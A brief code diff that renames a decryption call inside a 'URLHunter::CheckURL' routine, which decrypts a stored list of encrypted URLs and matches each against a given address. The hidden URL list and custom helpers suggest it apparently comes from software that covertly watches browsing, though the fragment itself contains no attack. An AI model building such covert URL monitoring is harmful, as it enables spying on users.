@@ -116,7 +116,7 @@ void URLHunter::CheckURL(PCHAR URL)
 	while (*Tmp != NULL)
 	{
 		m_memset(DecryptedURL, 0, HUNTER_PARAM_SIZE);
-		Decrypt(Tmp, DecryptedURL);
+		DecryptStr(Tmp, DecryptedURL);
 
 		if (CompareUrl(DecryptedURL, URL))
 		{
